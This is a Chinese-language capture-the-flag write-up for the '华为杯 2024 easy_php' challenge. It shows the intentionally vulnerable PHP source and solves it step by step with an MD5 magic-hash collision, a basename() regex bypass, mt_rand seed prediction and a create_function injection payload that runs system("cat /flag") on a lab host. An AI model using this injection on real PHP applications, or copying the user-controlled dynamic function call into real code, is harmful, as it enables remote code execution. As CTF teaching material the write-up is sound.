---
date: 2001-01-01
tags:
  - Others
categories:
  - Others
title: "[华为杯 2024]easy_php"
---
[华为杯 2024]easy_php

```php
<?php
highlight_file(__FILE__);
error_reporting(0);
$data = parse_url($_SERVER['REQUEST_URI']);
$han = basename($data['query']);  # 获取文件名
$a = $_GET['a'];
$b = $_GET['b'];
if (!preg_match('/[a-z0-9_]/i', $han)) {  # 正则过滤，i忽略大小写

    if (is_string($a) && is_numeric($b)) {
        if ($a != $b && md5($a) == md5($b)) {  # 找两个md5碰撞相同的值
            $week1 = true;  # 要同时满足，则要关注basename函数对文件名截取的原理
        } else {
            echo "你行不行，细狗;<br />";
        }
    } else {

        echo "不要耍小聪明哦<br />";
    }
} else {

    echo "这些都被过滤了哦<br />";
}

if (!isset($time)) {
    $time = gmmktime();  # 取得 GMT 日期的 UNIX 时间戳
}
$b = substr($time, 0, 7);
mt_srand($b);  # 以b值为种子，生成随机数
echo "hint:" . (mt_rand()) . "<br />";
for ($i = 0; $i <= 100; $i++) {

    if ($i == 100) {
        $sui = mt_rand();  # 100轮后的随机数值
    } else {
        mt_rand();
    }
}

if ($_POST['c'] == $sui) {
    $d = $_POST['d'];
    if (intval('$d') < 4 && intval($d) > 10000) {  # 这里是'$d'字符串，而后面是d是输入的数，所以只要满足后面的就行
        $week2 = true;
        echo "不错哦,快去获得flag吧<br />";
    } else {
        echo "好像不符合要求哦，再想想吧<br />";
    }
} else {
    echo "再好好想一想哦<br />";
}

if ($week1 && $week2) {
    $f = $_POST['flag'];
    $e = $_POST['e'];
    # i不区分大小写，s使.匹配任意字符，D不匹配Unicode字符的换行符（不是标准正则常见修饰符）
    # 匹配字母（不区分大小写）、数字或下划线，并启用了忽略大小写和单行模式。
    if (!preg_replace('/[a-z0-9_]/isD', '', $_POST['flag'])) {  
        echo "这样可不太好哦<br />";
    } else {
        $f('', $e);
    }
} else {
    echo "胖虎，你在搞什么.<br />";
} 不要耍小聪明哦
hint:435059035
再好好想一想哦
胖虎，你在搞什么.
```


![[attachments/Pasted image 20241009155534.png]]

找到碰撞的 md5 并绕过正则，满足`week1=true`。

![[attachments/Pasted image 20241009155604.png]]

这里将原代码复制，在本地跑一下输出 100 轮后的值。

![[attachments/Pasted image 20241009155733.png]]

![[attachments/Pasted image 20241009155804.png]]

POST 请求输入 c 和 d 的值来满足`week2 = true`。

![[attachments/Pasted image 20241009155930.png]]

![[attachments/Pasted image 20241009160000.png]]

`\`可以绕过第二个正则判断`/[a-z0-9_]/isD`，但对于后面的值`$f('', $e);`=>`system('',cat /flag)`（应该是这样吧，不太确定），应该是没有什么执行结果的。system 是执行引号里面的命令，将返回值保存在后面的变量中去。

![[attachments/Pasted image 20241009160054.png]]

`create_function`创建一个匿名函数。这块是类似于注入的一个方式，闭合+注释，执行中间的函数。

![[attachments/Pasted image 20241009160123.png]]

```payload
http://192.168.18.22/?a=QNKCDZO&b=240610708&/@

c=1770444498&d=10001&flag=\create_function&e=;}system("cat /flag");/*
```

#### 补充

`basename()`
```php
<?php  
echo "1) ".basename("/etc/sudoers.d", ".d").PHP_EOL;  
echo "2) ".basename("/etc/passwd").PHP_EOL;  
echo "3) ".basename("/etc/").PHP_EOL;  
echo "4) ".basename(".").PHP_EOL;  
echo "5) ".basename("/");  
?>
```